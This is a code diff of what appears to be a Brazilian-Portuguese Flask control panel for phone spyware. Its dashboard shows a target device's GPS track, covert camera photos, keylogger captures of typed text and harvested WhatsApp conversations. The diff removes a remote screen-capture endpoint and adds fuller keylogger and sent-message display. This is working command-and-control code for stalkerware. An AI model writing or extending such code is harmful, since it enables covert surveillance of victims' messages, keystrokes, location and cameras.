@@ -39,27 +39,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; min-width: 70px; }
         .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
         .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        /* CELULAR */
-        .phone-section { margin-bottom: 15px; text-align: center; }
-        .phone-section h3 { color: #f59e0b; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
-        .phone-frame {
-            display: inline-block; position: relative; width: 200px; height: 400px;
-            background: #1a1a1a; border: 4px solid #333; border-radius: 25px;
-            overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
-        .phone-notch {
-            position: absolute; top: 8px; left: 50%; transform: translateX(-50%);
-            width: 80px; height: 6px; background: #444; border-radius: 3px; z-index: 2;
-        }
-        .phone-screen {
-            width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;
-            background: #000; padding: 20px 5px;
-        }
-        .phone-screen img { width: 100%; height: 100%; object-fit: contain; display: none; }
-        .phone-placeholder { color: #555; font-size: 10px; text-align: center; }
-        .btn-print { display: block; width: 100%; background: #f59e0b; color: #000; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 15px; }
-        
         .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
         @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
         .cam-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
@@ -82,12 +61,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .chat-card.aberto .chat-card-body { display: block; }
         .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
         .chat-msg.recebida { color: #94a3b8; }
+        .chat-msg.enviada { color: #38bdf8; text-align: right; }
         .chat-msg.midia { color: #f59e0b; }
         .chat-msg .hora { color: #64748b; font-size: 9px; }
+        .chat-msg .tipo-tag { font-size: 8px; text-transform: uppercase; }
         
         .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
         .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
         .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
+        .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
         
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
@@ -118,20 +100,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <div class="info-box"><span>⏱️ Tempo Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                 </div>
-                
-                <!-- CELULAR + PRINT -->
-                <div class="phone-section">
-                    <h3>📱 Tela do Dispositivo</h3>
-                    <div class="phone-frame">
-                        <div class="phone-notch"></div>
-                        <div class="phone-screen">
-                            <span id="phonePlaceholder" class="phone-placeholder">Clique em<br>"📱 Print Tela"</span>
-                            <img id="phoneScreen" src="" alt="Tela" style="display:none;">
-                        </div>
-                    </div>
-                </div>
-                <button class="btn-print" onclick="enviarComando('print_tela'); setTimeout(tirarPrint, 3000);">📱 Print Tela</button>
-                
                 <div id="map_private" class="map-container"></div>
                 <div class="btn-row">
                     <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
@@ -172,21 +140,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     });
                 }
                 
-                function tirarPrint() {
-                    fetch('/api/get_print/{{ id_buscado }}')
-                        .then(r => r.json())
-                        .then(d => {
-                            if(d.print && d.print.length > 100) {
-                                document.getElementById('phonePlaceholder').style.display = 'none';
-                                document.getElementById('phoneScreen').src = 'data:image/png;base64,' + d.print;
-                                document.getElementById('phoneScreen').style.display = 'block';
-                            }
-                        });
-                }
-                
                 function toggleChat(pessoa, card) {
-                    if (card.classList.contains('aberto')) { card.classList.remove('aberto'); delete chatsAbertos[pessoa]; }
-                    else { card.classList.add('aberto'); chatsAbertos[pessoa] = true; }
+                    if (card.classList.contains('aberto')) {
+                        card.classList.remove('aberto');
+                        delete chatsAbertos[pessoa];
+                    } else {
+                        card.classList.add('aberto');
+                        chatsAbertos[pessoa] = true;
+                    }
                 }
                 
                 async function dispararCapturaDupla() {
@@ -227,22 +188,42 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 historico.setLatLngs(pontos);
                             }
                             
+                            // KEYLOGGER
                             let kb = document.getElementById('keylogBox');
                             if(d.keylog && d.keylog.ativo) {
                                 kb.className = 'keylog-box ativo';
-                                kb.innerHTML = '<p>⌨️ <span class="app-nome">' + d.keylog.app + '</span> monitorado' + (d.keylog.texto ? ' - ' + d.keylog.texto.substring(0,80) : '') + '</p>';
-                            } else {
-                                kb.className = 'keylog-box'; kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                                let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
+                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
+                            } else if(!d.keylog || !d.keylog.ativo) {
+                                kb.className = 'keylog-box';
+                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                             }
                             
+                            // WHATSAPP - Mantém cards abertos
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(chat => {
                                     let temMidia = chat.midia ? '📎 ' : '';
                                     let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
-                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)"><div class="chat-card-header"><span class="pessoa">👤 ${chat.pessoa}</span><div class="info"><span class="ultima">${temMidia}${chat.ultima_msg || ''}</span><span class="total">${chat.total}</span></div></div><div class="chat-card-body">`;
-                                    if(chat.mensagens) { chat.mensagens.slice().reverse().forEach(msg => { let cls = 'chat-msg ' + (msg.tipo || 'recebida'); if(msg.midia) cls += ' midia'; html += `<div class="${cls}">📥 ${msg.texto} <span class="hora">${msg.hora}</span></div>`; }); }
-                                    html += '</div></div>';
+                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
+                                        <div class="chat-card-header">
+                                            <span class="pessoa">👤 ${chat.pessoa}</span>
+                                            <div class="info">
+                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
+                                                <span class="total">${chat.total}</span>
+                                            </div>
+                                        </div>
+                                        <div class="chat-card-body">`;
+                                    
+                                    if(chat.mensagens) {
+                                        chat.mensagens.slice().reverse().forEach(msg => {
+                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
+                                            if(msg.midia) cls += ' midia';
+                                            html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                        });
+                                    }
+                                    
+                                    html += `</div></div>`;
                                 });
                                 document.getElementById('chatList').innerHTML = html;
                             }
@@ -309,25 +290,6 @@ def upload_lote():
         if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 404
-
-@app.route('/api/upload_print', methods=['POST'])
-def upload_print():
-    """Endpoint EXCLUSIVO para print de tela"""
-    data = request.get_json(force=True, silent=True) or {}
-    dev_id = data.get("device_id", '').upper()
-    foto = data.get("photo", "")
-    if dev_id and dev_id in db_dispositivos and foto:
-        db_dispositivos[dev_id]["print_tela"] = foto
-        return jsonify({"status": "stored"}), 200
-    return jsonify({"status": "error"}), 400
-
-@app.route('/api/get_print/<device_id>')
-def get_print(device_id):
-    """Retorna APENAS o print, sem misturar com câmera"""
-    device_id = device_id.upper()
-    if device_id in db_dispositivos:
-        return jsonify({"print": db_dispositivos[device_id].get("print_tela", "")}), 200
-    return jsonify({"print": ""}), 404
 
 @app.route('/api/get_camera/<device_id>')
 def get_camera(device_id):
